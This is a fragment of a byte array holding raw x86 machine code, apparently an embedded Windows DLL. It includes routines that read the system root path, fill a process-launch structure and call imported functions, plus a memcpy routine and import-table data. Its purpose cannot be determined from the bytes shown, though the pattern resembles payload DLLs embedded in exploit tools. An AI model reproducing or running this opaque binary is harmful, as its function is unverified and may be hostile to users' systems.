	0x6A, 0x0D, 0x33, 0xD2, 0x59, 0xE8, 0xB5, 0xFE, 0xFF, 0xFF, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF,
	0x15, 0x50, 0x40, 0x00, 0x10, 0xFF, 0x15, 0xA0, 0x40, 0x00, 0x10, 0x8B, 0xF0, 0xC7, 0x45, 0x08,
	0x00, 0x00, 0x00, 0x00, 0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0x85, 0xF0, 0xFD, 0xFF, 0xFF, 0x50,
	0x56, 0xFF, 0x15, 0x98, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x4A, 0xBA, 0x70, 0x43, 0x00, 0x10,
	0x8D, 0x8D, 0xF0, 0xFD, 0xFF, 0xFF, 0xE8, 0x5F, 0xF4, 0xFF, 0xFF, 0x85, 0xC0, 0x75, 0x36, 0x8D,
	0x45, 0xFC, 0x50, 0x56, 0xFF, 0x15, 0xD4, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x27, 0x8B, 0x4D,
	0xFC, 0x8D, 0x55, 0x08, 0xE8, 0x1F, 0xEE, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x18, 0x83, 0x7D, 0x08,
	0x00, 0x74, 0x12, 0x8B, 0x4D, 0x0C, 0xE8, 0xC2, 0xFE, 0xFF, 0xFF, 0x6A, 0x0D, 0x33, 0xD2, 0x59,
	0xE8, 0x3A, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0xEB, 0x03, 0x33, 0xC0, 0x40, 0x5E, 0xC9, 0xC2, 0x08,
	0x00, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x10, 0x04, 0x00, 0x00, 0x53, 0x8B, 0x5D, 0x0C, 0x8D, 0x45,
	0x0C, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8B, 0x73, 0x04, 0x50, 0x57, 0xFF, 0x15, 0xD4, 0x40, 0x00,
	0x10, 0x39, 0x75, 0x0C, 0x75, 0x2F, 0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0x85, 0xF0, 0xFB, 0xFF,
	0xFF, 0x50, 0x57, 0xFF, 0x15, 0x98, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x18, 0xBA, 0xC0, 0x43,
	0x00, 0x10, 0x8D, 0x8D, 0xF0, 0xFB, 0xFF, 0xFF, 0xE8, 0xCD, 0xF3, 0xFF, 0xFF, 0x85, 0xC0, 0x75,
	0x04, 0x89, 0x3B, 0xEB, 0x03, 0x33, 0xC0, 0x40, 0x5F, 0x5E, 0x5B, 0xC9, 0xC2, 0x08, 0x00, 0x55,
	0x8B, 0xEC, 0x81, 0xEC, 0x6C, 0x04, 0x00, 0x00, 0xBA, 0x30, 0x00, 0xFE, 0x7F, 0x53, 0x56, 0x8B,
	0xF1, 0x8D, 0x8D, 0x94, 0xFB, 0xFF, 0xFF, 0xE8, 0x1B, 0xF4, 0xFF, 0xFF, 0xBA, 0xD0, 0x43, 0x00,
	0x10, 0xE8, 0x5F, 0xF3, 0xFF, 0xFF, 0xBA, 0xF0, 0x43, 0x00, 0x10, 0x8D, 0x8D, 0x94, 0xFB, 0xFF,
	0xFF, 0xE8, 0x4F, 0xF3, 0xFF, 0xFF, 0x6A, 0x3C, 0x5A, 0x8B, 0xCA, 0x8D, 0x45, 0xBC, 0x33, 0xDB,
	0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D, 0x85, 0x94, 0xFB, 0xFF, 0xFF, 0x89, 0x55,
	0xBC, 0x89, 0x45, 0xCC, 0x8D, 0x45, 0xBC, 0x50, 0xC7, 0x45, 0xC0, 0x40, 0x00, 0x00, 0x00, 0xC7,
	0x45, 0xD0, 0x0C, 0x44, 0x00, 0x10, 0xC7, 0x45, 0xD8, 0x05, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x8C,
	0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x71, 0x6A, 0x18, 0x59, 0x8D, 0x45, 0xA4, 0x88, 0x18, 0x40,
	0x83, 0xE9, 0x01, 0x75, 0xF8, 0x53, 0x6A, 0x18, 0x8D, 0x45, 0xA4, 0x50, 0x53, 0xFF, 0x75, 0xF4,
	0xFF, 0x15, 0x08, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x3B, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF,
	0x15, 0x50, 0x40, 0x00, 0x10, 0x8B, 0x45, 0xB4, 0x89, 0x45, 0xFC, 0x8D, 0x45, 0xF8, 0x50, 0x68,
	0x01, 0x2D, 0x00, 0x10, 0x89, 0x5D, 0xF8, 0xFF, 0x15, 0xC0, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x75,
	0x14, 0x39, 0x5D, 0xF8, 0x74, 0x0F, 0x56, 0x68, 0xFD, 0x2B, 0x00, 0x10, 0xFF, 0x75, 0xF8, 0xFF,
	0x15, 0xA8, 0x40, 0x00, 0x10, 0x53, 0xFF, 0x75, 0xF4, 0xFF, 0x15, 0x5C, 0x40, 0x00, 0x10, 0xFF,
	0x75, 0xF4, 0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x81,
	0xEC, 0x68, 0x04, 0x00, 0x00, 0x8D, 0x8D, 0x98, 0xFB, 0xFF, 0xFF, 0xBA, 0x30, 0x00, 0xFE, 0x7F,
	0x53, 0x56, 0x6A, 0x05, 0x5E, 0xE8, 0x2D, 0xF3, 0xFF, 0xFF, 0xBA, 0xD0, 0x43, 0x00, 0x10, 0xE8,
	0x71, 0xF2, 0xFF, 0xFF, 0xBA, 0x20, 0x44, 0x00, 0x10, 0x8D, 0x8D, 0x98, 0xFB, 0xFF, 0xFF, 0xE8,
	0x61, 0xF2, 0xFF, 0xFF, 0x6A, 0x3C, 0x5A, 0x8B, 0xCA, 0x8D, 0x45, 0xA8, 0x33, 0xDB, 0x88, 0x18,
	0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D, 0x85, 0x98, 0xFB, 0xFF, 0xFF, 0x89, 0x55, 0xA8, 0x89,
	0x45, 0xB8, 0x8D, 0x45, 0xA8, 0x50, 0xC7, 0x45, 0xAC, 0x40, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xBC,
	0x30, 0x44, 0x00, 0x10, 0x89, 0x75, 0xC4, 0xFF, 0x15, 0x8C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74,
	0x70, 0x53, 0x68, 0x4C, 0x44, 0x00, 0x10, 0xFF, 0x15, 0x9C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x75,
	0x12, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0x15, 0x50, 0x40, 0x00, 0x10, 0x83, 0xEE, 0x01, 0x75,
	0xE0, 0xEB, 0x3B, 0x50, 0xFF, 0x15, 0xC8, 0x40, 0x00, 0x10, 0x33, 0xC0, 0x89, 0x5D, 0xF0, 0x6A,
	0x70, 0x66, 0x89, 0x45, 0xEA, 0x33, 0xC9, 0x58, 0x66, 0x89, 0x45, 0xE8, 0x41, 0x6A, 0x1C, 0x8D,
	0x45, 0xE4, 0x89, 0x4D, 0xE4, 0x50, 0x51, 0x89, 0x5D, 0xF4, 0x89, 0x5D, 0xEC, 0xFF, 0x15, 0xB0,
	0x40, 0x00, 0x10, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0x15, 0x50, 0x40, 0x00, 0x10, 0x53, 0xFF,
	0x75, 0xE0, 0xFF, 0x15, 0x5C, 0x40, 0x00, 0x10, 0xFF, 0x75, 0xE0, 0xFF, 0x15, 0x2C, 0x40, 0x00,
	0x10, 0x5E, 0x5B, 0xC9, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x57, 0x56, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x4C, 0x24, 0x14, 0x8B, 0x7C, 0x24, 0x0C, 0x8B, 0xC1,
	0x8B, 0xD1, 0x03, 0xC6, 0x3B, 0xFE, 0x76, 0x08, 0x3B, 0xF8, 0x0F, 0x82, 0x94, 0x02, 0x00, 0x00,
	0x83, 0xF9, 0x20, 0x0F, 0x82, 0xD2, 0x04, 0x00, 0x00, 0x81, 0xF9, 0x80, 0x00, 0x00, 0x00, 0x73,
	0x13, 0x0F, 0xBA, 0x25, 0x08, 0x80, 0x00, 0x10, 0x01, 0x0F, 0x82, 0x8E, 0x04, 0x00, 0x00, 0xE9,
	0xE3, 0x01, 0x00, 0x00, 0x0F, 0xBA, 0x25, 0x28, 0x80, 0x00, 0x10, 0x01, 0x73, 0x09, 0xF3, 0xA4,
	0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x8B, 0xC7, 0x33, 0xC6, 0xA9, 0x0F, 0x00, 0x00, 0x00,
	0x75, 0x0E, 0x0F, 0xBA, 0x25, 0x08, 0x80, 0x00, 0x10, 0x01, 0x0F, 0x82, 0xE0, 0x03, 0x00, 0x00,
	0x0F, 0xBA, 0x25, 0x28, 0x80, 0x00, 0x10, 0x00, 0x0F, 0x83, 0xA9, 0x01, 0x00, 0x00, 0xF7, 0xC7,
	0x03, 0x00, 0x00, 0x00, 0x0F, 0x85, 0x9D, 0x01, 0x00, 0x00, 0xF7, 0xC6, 0x03, 0x00, 0x00, 0x00,
	0x0F, 0x85, 0xAC, 0x01, 0x00, 0x00, 0x0F, 0xBA, 0xE7, 0x02, 0x73, 0x0D, 0x8B, 0x06, 0x83, 0xE9,
	0x04, 0x8D, 0x76, 0x04, 0x89, 0x07, 0x8D, 0x7F, 0x04, 0x0F, 0xBA, 0xE7, 0x03, 0x73, 0x11, 0xF3,
	0x0F, 0x7E, 0x0E, 0x83, 0xE9, 0x08, 0x8D, 0x76, 0x08, 0x66, 0x0F, 0xD6, 0x0F, 0x8D, 0x7F, 0x08,
	0xF7, 0xC6, 0x07, 0x00, 0x00, 0x00, 0x74, 0x65, 0x0F, 0xBA, 0xE6, 0x03, 0x0F, 0x83, 0xB4, 0x00,
	0x00, 0x00, 0x66, 0x0F, 0x6F, 0x4E, 0xF4, 0x8D, 0x76, 0xF4, 0x8B, 0xFF, 0x66, 0x0F, 0x6F, 0x5E,
	0x10, 0x83, 0xE9, 0x30, 0x66, 0x0F, 0x6F, 0x46, 0x20, 0x66, 0x0F, 0x6F, 0x6E, 0x30, 0x8D, 0x76,
	0x30, 0x83, 0xF9, 0x30, 0x66, 0x0F, 0x6F, 0xD3, 0x66, 0x0F, 0x3A, 0x0F, 0xD9, 0x0C, 0x66, 0x0F,
	0x7F, 0x1F, 0x66, 0x0F, 0x6F, 0xE0, 0x66, 0x0F, 0x3A, 0x0F, 0xC2, 0x0C, 0x66, 0x0F, 0x7F, 0x47,
	0x10, 0x66, 0x0F, 0x6F, 0xCD, 0x66, 0x0F, 0x3A, 0x0F, 0xEC, 0x0C, 0x66, 0x0F, 0x7F, 0x6F, 0x20,
	0x8D, 0x7F, 0x30, 0x73, 0xB7, 0x8D, 0x76, 0x0C, 0xE9, 0xAF, 0x00, 0x00, 0x00, 0x66, 0x0F, 0x6F,
	0x4E, 0xF8, 0x8D, 0x76, 0xF8, 0x8D, 0x49, 0x00, 0x66, 0x0F, 0x6F, 0x5E, 0x10, 0x83, 0xE9, 0x30,
	0x66, 0x0F, 0x6F, 0x46, 0x20, 0x66, 0x0F, 0x6F, 0x6E, 0x30, 0x8D, 0x76, 0x30, 0x83, 0xF9, 0x30,
	0x66, 0x0F, 0x6F, 0xD3, 0x66, 0x0F, 0x3A, 0x0F, 0xD9, 0x08, 0x66, 0x0F, 0x7F, 0x1F, 0x66, 0x0F,
	0x6F, 0xE0, 0x66, 0x0F, 0x3A, 0x0F, 0xC2, 0x08, 0x66, 0x0F, 0x7F, 0x47, 0x10, 0x66, 0x0F, 0x6F,
	0xCD, 0x66, 0x0F, 0x3A, 0x0F, 0xEC, 0x08, 0x66, 0x0F, 0x7F, 0x6F, 0x20, 0x8D, 0x7F, 0x30, 0x73,
	0xB7, 0x8D, 0x76, 0x08, 0xEB, 0x56, 0x66, 0x0F, 0x6F, 0x4E, 0xFC, 0x8D, 0x76, 0xFC, 0x8B, 0xFF,
	0x66, 0x0F, 0x6F, 0x5E, 0x10, 0x83, 0xE9, 0x30, 0x66, 0x0F, 0x6F, 0x46, 0x20, 0x66, 0x0F, 0x6F,
	0x6E, 0x30, 0x8D, 0x76, 0x30, 0x83, 0xF9, 0x30, 0x66, 0x0F, 0x6F, 0xD3, 0x66, 0x0F, 0x3A, 0x0F,
	0xD9, 0x04, 0x66, 0x0F, 0x7F, 0x1F, 0x66, 0x0F, 0x6F, 0xE0, 0x66, 0x0F, 0x3A, 0x0F, 0xC2, 0x04,
	0x66, 0x0F, 0x7F, 0x47, 0x10, 0x66, 0x0F, 0x6F, 0xCD, 0x66, 0x0F, 0x3A, 0x0F, 0xEC, 0x04, 0x66,
	0x0F, 0x7F, 0x6F, 0x20, 0x8D, 0x7F, 0x30, 0x73, 0xB7, 0x8D, 0x76, 0x04, 0x83, 0xF9, 0x10, 0x72,
	0x13, 0xF3, 0x0F, 0x6F, 0x0E, 0x83, 0xE9, 0x10, 0x8D, 0x76, 0x10, 0x66, 0x0F, 0x7F, 0x0F, 0x8D,
	0x7F, 0x10, 0xEB, 0xE8, 0x0F, 0xBA, 0xE1, 0x02, 0x73, 0x0D, 0x8B, 0x06, 0x83, 0xE9, 0x04, 0x8D,
	0x76, 0x04, 0x89, 0x07, 0x8D, 0x7F, 0x04, 0x0F, 0xBA, 0xE1, 0x03, 0x73, 0x11, 0xF3, 0x0F, 0x7E,
	0x0E, 0x83, 0xE9, 0x08, 0x8D, 0x76, 0x08, 0x66, 0x0F, 0xD6, 0x0F, 0x8D, 0x7F, 0x08, 0x8B, 0x04,
	0x8D, 0xA4, 0x31, 0x00, 0x10, 0xFF, 0xE0, 0xF7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x74, 0x13, 0x8A,
	0x06, 0x88, 0x07, 0x49, 0x83, 0xC6, 0x01, 0x83, 0xC7, 0x01, 0xF7, 0xC7, 0x03, 0x00, 0x00, 0x00,
	0x75, 0xED, 0x8B, 0xD1, 0x83, 0xF9, 0x20, 0x0F, 0x82, 0xAE, 0x02, 0x00, 0x00, 0xC1, 0xE9, 0x02,
	0xF3, 0xA5, 0x83, 0xE2, 0x03, 0xFF, 0x24, 0x95, 0xA4, 0x31, 0x00, 0x10, 0xFF, 0x24, 0x8D, 0xB4,
	0x31, 0x00, 0x10, 0x90, 0xB4, 0x31, 0x00, 0x10, 0xBC, 0x31, 0x00, 0x10, 0xC8, 0x31, 0x00, 0x10,
	0xDC, 0x31, 0x00, 0x10, 0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x90, 0x8A, 0x06, 0x88, 0x07,
	0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x90, 0x8A, 0x06, 0x88, 0x07, 0x8A, 0x46, 0x01, 0x88,
	0x47, 0x01, 0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x8D, 0x49, 0x00, 0x8A, 0x06, 0x88, 0x07,
	0x8A, 0x46, 0x01, 0x88, 0x47, 0x01, 0x8A, 0x46, 0x02, 0x88, 0x47, 0x02, 0x8B, 0x44, 0x24, 0x0C,
	0x5E, 0x5F, 0xC3, 0x90, 0x8D, 0x34, 0x0E, 0x8D, 0x3C, 0x0F, 0x83, 0xF9, 0x20, 0x0F, 0x82, 0x51,
	0x01, 0x00, 0x00, 0x0F, 0xBA, 0x25, 0x08, 0x80, 0x00, 0x10, 0x01, 0x0F, 0x82, 0x94, 0x00, 0x00,
	0x00, 0xF7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x74, 0x14, 0x8B, 0xD7, 0x83, 0xE2, 0x03, 0x2B, 0xCA,
	0x8A, 0x46, 0xFF, 0x88, 0x47, 0xFF, 0x4E, 0x4F, 0x83, 0xEA, 0x01, 0x75, 0xF3, 0x83, 0xF9, 0x20,
	0x0F, 0x82, 0x1E, 0x01, 0x00, 0x00, 0x8B, 0xD1, 0xC1, 0xE9, 0x02, 0x83, 0xE2, 0x03, 0x83, 0xEE,
	0x04, 0x83, 0xEF, 0x04, 0xFD, 0xF3, 0xA5, 0xFC, 0xFF, 0x24, 0x95, 0x50, 0x32, 0x00, 0x10, 0x90,
	0x60, 0x32, 0x00, 0x10, 0x68, 0x32, 0x00, 0x10, 0x78, 0x32, 0x00, 0x10, 0x8C, 0x32, 0x00, 0x10,
	0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x90, 0x8A, 0x46, 0x03, 0x88, 0x47, 0x03, 0x8B, 0x44,
	0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x8D, 0x49, 0x00, 0x8A, 0x46, 0x03, 0x88, 0x47, 0x03, 0x8A, 0x46,
	0x02, 0x88, 0x47, 0x02, 0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x90, 0x8A, 0x46, 0x03, 0x88,
	0x47, 0x03, 0x8A, 0x46, 0x02, 0x88, 0x47, 0x02, 0x8A, 0x46, 0x01, 0x88, 0x47, 0x01, 0x8B, 0x44,
	0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0xF7, 0xC7, 0x0F, 0x00, 0x00, 0x00, 0x74, 0x0F, 0x49, 0x4E, 0x4F,
	0x8A, 0x06, 0x88, 0x07, 0xF7, 0xC7, 0x0F, 0x00, 0x00, 0x00, 0x75, 0xF1, 0x81, 0xF9, 0x80, 0x00,
	0x00, 0x00, 0x72, 0x68, 0x81, 0xEE, 0x80, 0x00, 0x00, 0x00, 0x81, 0xEF, 0x80, 0x00, 0x00, 0x00,
	0xF3, 0x0F, 0x6F, 0x06, 0xF3, 0x0F, 0x6F, 0x4E, 0x10, 0xF3, 0x0F, 0x6F, 0x56, 0x20, 0xF3, 0x0F,
	0x6F, 0x5E, 0x30, 0xF3, 0x0F, 0x6F, 0x66, 0x40, 0xF3, 0x0F, 0x6F, 0x6E, 0x50, 0xF3, 0x0F, 0x6F,
	0x76, 0x60, 0xF3, 0x0F, 0x6F, 0x7E, 0x70, 0xF3, 0x0F, 0x7F, 0x07, 0xF3, 0x0F, 0x7F, 0x4F, 0x10,
	0xF3, 0x0F, 0x7F, 0x57, 0x20, 0xF3, 0x0F, 0x7F, 0x5F, 0x30, 0xF3, 0x0F, 0x7F, 0x67, 0x40, 0xF3,
	0x0F, 0x7F, 0x6F, 0x50, 0xF3, 0x0F, 0x7F, 0x77, 0x60, 0xF3, 0x0F, 0x7F, 0x7F, 0x70, 0x81, 0xE9,
	0x80, 0x00, 0x00, 0x00, 0xF7, 0xC1, 0x80, 0xFF, 0xFF, 0xFF, 0x75, 0x90, 0x83, 0xF9, 0x20, 0x72,
	0x23, 0x83, 0xEE, 0x20, 0x83, 0xEF, 0x20, 0xF3, 0x0F, 0x6F, 0x06, 0xF3, 0x0F, 0x6F, 0x4E, 0x10,
	0xF3, 0x0F, 0x7F, 0x07, 0xF3, 0x0F, 0x7F, 0x4F, 0x10, 0x83, 0xE9, 0x20, 0xF7, 0xC1, 0xE0, 0xFF,
	0xFF, 0xFF, 0x75, 0xDD, 0xF7, 0xC1, 0xFC, 0xFF, 0xFF, 0xFF, 0x74, 0x15, 0x83, 0xEF, 0x04, 0x83,
	0xEE, 0x04, 0x8B, 0x06, 0x89, 0x07, 0x83, 0xE9, 0x04, 0xF7, 0xC1, 0xFC, 0xFF, 0xFF, 0xFF, 0x75,
	0xEB, 0x85, 0xC9, 0x74, 0x0F, 0x83, 0xEF, 0x01, 0x83, 0xEE, 0x01, 0x8A, 0x06, 0x88, 0x07, 0x83,
	0xE9, 0x01, 0x75, 0xF1, 0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0xEB, 0x03, 0xCC, 0xCC, 0xCC,
	0x8B, 0xC6, 0x83, 0xE0, 0x0F, 0x85, 0xC0, 0x0F, 0x85, 0xE3, 0x00, 0x00, 0x00, 0x8B, 0xD1, 0x83,
	0xE1, 0x7F, 0xC1, 0xEA, 0x07, 0x74, 0x66, 0x8D, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xFF,
	0x66, 0x0F, 0x6F, 0x06, 0x66, 0x0F, 0x6F, 0x4E, 0x10, 0x66, 0x0F, 0x6F, 0x56, 0x20, 0x66, 0x0F,
	0x6F, 0x5E, 0x30, 0x66, 0x0F, 0x7F, 0x07, 0x66, 0x0F, 0x7F, 0x4F, 0x10, 0x66, 0x0F, 0x7F, 0x57,
	0x20, 0x66, 0x0F, 0x7F, 0x5F, 0x30, 0x66, 0x0F, 0x6F, 0x66, 0x40, 0x66, 0x0F, 0x6F, 0x6E, 0x50,
	0x66, 0x0F, 0x6F, 0x76, 0x60, 0x66, 0x0F, 0x6F, 0x7E, 0x70, 0x66, 0x0F, 0x7F, 0x67, 0x40, 0x66,
	0x0F, 0x7F, 0x6F, 0x50, 0x66, 0x0F, 0x7F, 0x77, 0x60, 0x66, 0x0F, 0x7F, 0x7F, 0x70, 0x8D, 0xB6,
	0x80, 0x00, 0x00, 0x00, 0x8D, 0xBF, 0x80, 0x00, 0x00, 0x00, 0x4A, 0x75, 0xA3, 0x85, 0xC9, 0x74,
	0x5F, 0x8B, 0xD1, 0xC1, 0xEA, 0x05, 0x85, 0xD2, 0x74, 0x21, 0x8D, 0x9B, 0x00, 0x00, 0x00, 0x00,
	0xF3, 0x0F, 0x6F, 0x06, 0xF3, 0x0F, 0x6F, 0x4E, 0x10, 0xF3, 0x0F, 0x7F, 0x07, 0xF3, 0x0F, 0x7F,
	0x4F, 0x10, 0x8D, 0x76, 0x20, 0x8D, 0x7F, 0x20, 0x4A, 0x75, 0xE5, 0x83, 0xE1, 0x1F, 0x74, 0x30,
	0x8B, 0xC1, 0xC1, 0xE9, 0x02, 0x74, 0x0F, 0x8B, 0x16, 0x89, 0x17, 0x83, 0xC7, 0x04, 0x83, 0xC6,
	0x04, 0x83, 0xE9, 0x01, 0x75, 0xF1, 0x8B, 0xC8, 0x83, 0xE1, 0x03, 0x74, 0x13, 0x8A, 0x06, 0x88,
	0x07, 0x46, 0x47, 0x49, 0x75, 0xF7, 0x8D, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x49, 0x00,
	0x8B, 0x44, 0x24, 0x0C, 0x5E, 0x5F, 0xC3, 0x8D, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xFF,
	0xBA, 0x10, 0x00, 0x00, 0x00, 0x2B, 0xD0, 0x2B, 0xCA, 0x51, 0x8B, 0xC2, 0x8B, 0xC8, 0x83, 0xE1,
	0x03, 0x74, 0x09, 0x8A, 0x16, 0x88, 0x17, 0x46, 0x47, 0x49, 0x75, 0xF7, 0xC1, 0xE8, 0x02, 0x74,
	0x0D, 0x8B, 0x16, 0x89, 0x17, 0x8D, 0x76, 0x04, 0x8D, 0x7F, 0x04, 0x48, 0x75, 0xF3, 0x59, 0xE9,
	0xE9, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4C, 0x74, 0x00, 0x00, 0x64, 0x74, 0x00, 0x00, 0x78, 0x74, 0x00, 0x00, 0x36, 0x74, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x88, 0x71, 0x00, 0x00, 0x9E, 0x71, 0x00, 0x00, 0xB0, 0x71, 0x00, 0x00,
	0xBE, 0x71, 0x00, 0x00, 0xCE, 0x71, 0x00, 0x00, 0xDE, 0x71, 0x00, 0x00, 0xFA, 0x71, 0x00, 0x00,
	0x08, 0x72, 0x00, 0x00, 0x64, 0x71, 0x00, 0x00, 0x18, 0x72, 0x00, 0x00, 0x38, 0x72, 0x00, 0x00,
	0x4A, 0x72, 0x00, 0x00, 0x60, 0x72, 0x00, 0x00, 0x72, 0x72, 0x00, 0x00, 0x80, 0x72, 0x00, 0x00,
	0x96, 0x72, 0x00, 0x00, 0x9E, 0x72, 0x00, 0x00, 0xBA, 0x72, 0x00, 0x00, 0xC8, 0x72, 0x00, 0x00,
	0x40, 0x71, 0x00, 0x00, 0x2A, 0x71, 0x00, 0x00, 0x18, 0x71, 0x00, 0x00, 0x04, 0x71, 0x00, 0x00,
	0xF2, 0x70, 0x00, 0x00, 0x7A, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x80,
	0x06, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x70, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x9E, 0x73, 0x00, 0x00, 0xAC, 0x73, 0x00, 0x00, 0xBC, 0x73, 0x00, 0x00,
	0xCA, 0x73, 0x00, 0x00, 0xE0, 0x73, 0x00, 0x00, 0xF6, 0x73, 0x00, 0x00, 0x0A, 0x74, 0x00, 0x00,
	0x7C, 0x73, 0x00, 0x00, 0x18, 0x73, 0x00, 0x00, 0x06, 0x73, 0x00, 0x00, 0xF8, 0x72, 0x00, 0x00,
	0xEA, 0x72, 0x00, 0x00, 0x6A, 0x73, 0x00, 0x00, 0x88, 0x73, 0x00, 0x00, 0x54, 0x73, 0x00, 0x00,
	0x40, 0x73, 0x00, 0x00, 0x24, 0x73, 0x00, 0x00, 0x1A, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x28, 0x77, 0x00, 0x00, 0x06, 0x77, 0x00, 0x00, 0xF0, 0x76, 0x00, 0x00, 0xEC, 0x74, 0x00, 0x00,
	0x02, 0x75, 0x00, 0x00, 0x16, 0x75, 0x00, 0x00, 0xFA, 0x75, 0x00, 0x00, 0x28, 0x75, 0x00, 0x00,
	0x3E, 0x75, 0x00, 0x00, 0x5C, 0x75, 0x00, 0x00, 0x6A, 0x75, 0x00, 0x00, 0x86, 0x75, 0x00, 0x00,
	0xA4, 0x75, 0x00, 0x00, 0xB4, 0x75, 0x00, 0x00, 0xCC, 0x75, 0x00, 0x00, 0xE6, 0x75, 0x00, 0x00,
